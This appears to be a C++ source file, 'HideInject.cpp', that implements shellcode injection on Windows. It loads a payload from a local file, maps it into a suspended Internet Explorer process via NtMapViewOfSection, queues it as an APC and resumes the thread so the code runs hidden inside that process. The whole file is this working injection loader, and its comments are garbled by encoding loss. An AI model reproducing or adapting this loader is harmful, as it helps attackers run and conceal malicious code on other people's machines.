// HideInject.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#include <windows.h>  

typedef LONG NTSTATUS, *PNTSTATUS;  
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)  

typedef enum _SECTION_INHERIT   
{  
	ViewShare = 1,  
	ViewUnmap = 2  
} SECTION_INHERIT;  

typedef NTSTATUS (__stdcall *func_NtMapViewOfSection) ( HANDLE, HANDLE, LPVOID, ULONG, SIZE_T, LARGE_INTEGER*, SIZE_T*, SECTION_INHERIT, ULONG, ULONG );  

func_NtMapViewOfSection NtMapViewOfSection = NULL;  


LPVOID NTAPI MyMapViewOfFileEx( HANDLE hProcess, HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow,   
							   DWORD dwNumberOfBytesToMap, LPVOID lpBaseAddress )    
{  
	NTSTATUS Status;  
	LARGE_INTEGER SectionOffset;  
	ULONG ViewSize;  
	ULONG Protect;  
	LPVOID ViewBase;  


	// ת��ƫ����  
	SectionOffset.LowPart = dwFileOffsetLow;  
	SectionOffset.HighPart = dwFileOffsetHigh;  

	// �����С����ʼ��ַ  
	ViewBase = lpBaseAddress;  
	ViewSize = dwNumberOfBytesToMap;  

	// ת����־ΪNT��������  
	if (dwDesiredAccess & FILE_MAP_WRITE)  
	{  
		Protect = PAGE_READWRITE;  
	}  
	else if (dwDesiredAccess & FILE_MAP_READ)  
	{  
		Protect = PAGE_READONLY;  
	}  
	else if (dwDesiredAccess & FILE_MAP_COPY)  
	{  
		Protect = PAGE_WRITECOPY;  
	}  
	else  
	{  
		Protect = PAGE_NOACCESS;  
	}  

	//ӳ������  
	Status = NtMapViewOfSection(hFileMappingObject,  
		hProcess,  
		&ViewBase,  
		0,  
		0,  
		&SectionOffset,  
		&ViewSize,  
		ViewShare,  
		0,  
		Protect);  
	if (!NT_SUCCESS(Status))  
	{  
		// ʧ��  
		return NULL;  
	}  

	//������ʼ��ַ  
	return ViewBase;  
}  


int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hDll = LoadLibrary( "ntdll.dll" );  

	NtMapViewOfSection = (func_NtMapViewOfSection) GetProcAddress (hDll, "NtMapViewOfSection");  

	// ȡShellCode,�κ�����ʵ�ֵ�  
	HANDLE hFile = CreateFile ("C:\\shellcode.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);  

	HANDLE hMappedFile = CreateFileMapping (hFile, NULL, PAGE_READONLY, 0, 0, NULL);  

	// ����Ŀ�����  
	STARTUPINFO st;   
	ZeroMemory (&st, sizeof(st));  
	st.cb = sizeof (STARTUPINFO);  

	PROCESS_INFORMATION pi;  
	ZeroMemory (&pi, sizeof(pi));  

	CreateProcess ("C:\\Programme\\Internet Explorer\\iexplore.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &st, &pi);  


	// ע��shellcode��Ŀ����̵�ַ�ռ�  
	LPVOID MappedFile = MyMapViewOfFileEx (pi.hProcess, hMappedFile, FILE_MAP_READ, 0, 0, 0, NULL);  

	// ����һ���µ��ܹ���Ŀ���ָ̻߳�������ִ�е�APC  
	QueueUserAPC ((PAPCFUNC) MappedFile, pi.hThread, NULL);  
	ResumeThread (pi.hThread);  
	CloseHandle (hFile);  
	CloseHandle (hMappedFile);  
	CloseHandle (pi.hThread);  
	CloseHandle (pi.hProcess);  
	return 0;
	return 0;
}

